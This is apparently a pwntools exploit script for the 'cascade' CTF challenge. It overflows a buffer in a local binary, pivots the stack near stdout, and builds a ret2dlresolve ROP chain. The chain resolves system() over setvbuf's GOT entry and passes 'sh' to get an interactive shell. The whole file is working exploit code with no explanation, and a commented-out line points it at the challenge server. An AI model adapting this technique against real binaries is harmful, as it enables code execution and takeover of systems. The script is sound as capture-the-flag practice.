from pwn import *
import time

gdbscript="""
b*vuln+12
set follow-fork-mode parent
b*_dl_runtime_resolve_xsavec+121
"""

context.binary = elf = ELF("./vuln")
context.log_level = 'debug'
conn = process([elf.path])
gdb.attach(conn, api=True, gdbscript=gdbscript)
#conn = remote("localhost", 1337)
# conn = remote("cascade.chal.imaginaryctf.org", 1337)

rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=[], data_addr=0x000000404070, resolution_addr=elf.got.setvbuf)
pause()
conn.sendline((b"a"*64 + p64(elf.sym.stdout + 0x40) + p64(0x401162)).ljust(0x200-1, b'\0'))

rop = ROP(elf)
rop.ret2dlresolve(dlresolve)
rop.raw(rop.ret)
rop.main()

pause()
conn.sendline((p64(elf.sym.stdout+8) + b"sh\0\0\0\0\0\0" + b"a"*0x30 + p64(0x404f40) + p64(0x401162) + dlresolve.payload).ljust(0x200-1, b'\0'))
pause()
conn.sendline((b"a"*0x48 + rop.chain() + dlresolve.payload).ljust(0x200-1, b'\0'))

conn.interactive()